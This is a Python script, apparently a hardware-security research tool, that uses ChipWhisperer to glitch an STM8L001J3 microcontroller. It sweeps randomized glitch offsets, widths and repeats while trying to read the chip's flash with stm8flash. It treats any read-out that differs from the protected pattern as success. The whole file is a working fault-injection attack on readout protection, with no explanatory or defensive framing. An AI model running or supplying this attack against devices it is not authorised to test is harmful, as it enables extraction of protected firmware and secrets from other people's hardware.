#!/usr/bin/env python3

import sys
import chipwhisperer as cw
import subprocess
import time
import random

scope = cw.scope()
scope.default_setup()

STM8FLASH_PATH = "/home/test/software/stm8flash/stm8flash"

class STM8Flash():
  def __init__(self,scope=None):
    super().__init__()
    self.config = {}
    self.scope = scope
    print("Using STM8Flash driver")
    self.scope.io.target_pwr = False
    self.scope.io.pdic = "high"
    pass

  def drive(self,in_text=None):
    next_rand = [0x00 for _ in range(0,16)]
    self.scope.arm()
    time.sleep(0.5)
    self.scope.io.target_pwr = True
    time.sleep(0.25)
    self.scope.io.pdic = "low"
    p = subprocess.Popen([STM8FLASH_PATH,"-c","stlinkv2","-p","stm8l001j3","-r","/tmp/bonk.bin"])
    (data_out,data_err) = p.communicate()
    self.scope.io.pdic = "high"
    print("OK!")
    self.scope.capture()
    self.scope.io.target_pwr = False
    return (next_rand,next_rand)

  def check(self):
    f = open("/tmp/bonk.bin","rb")
    data = f.read(5)
    if data == b"\x71\x71\x71\x71\x71":
      f.close()
      return False
    else:
      f.close()
      return True

  def close(self):
    pass

print("Entering glitch loop (attack ver)")

scope.gain.gain = 25
scope.adc.samples=3000
scope.adc.offset = 0
scope.adc.basic_mode = "falling_edge"
scope.clock.clkgen_freq = 16000000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "glitch_only"
scope.glitch.trigger_src = 'ext_single'
scope.io.glitch_hp  = True
scope.io.glitch_lp = False

scope.io.target_pwr = False
scope.io.pdic = "high"

stm8 = STM8Flash(scope)

BASEOFFSET = 1700

while True:
  for i in range(0,5):
    print("BASEOFFSET = %d" % BASEOFFSET)
    scope.glitch.ext_offset = random.randint(BASEOFFSET - 10,BASEOFFSET + 10)
    scope.glitch.repeat=random.randint(1,10)
    scope.glitch.width=random.randint(35,45)
    print("Attempting glitch at %d:%d:%d" % (scope.glitch.ext_offset,scope.glitch.repeat,scope.glitch.width))
    stm8.drive()
    if stm8.check():
      print("Winner")
      scope.io.target_pwr = False
      scope.dis()
      sys.exit(0) 
  BASEOFFSET += 5
  if BASEOFFSET > 3900:
    BASEOFFSET = 1700

scope.dis()
sys.exit(0)


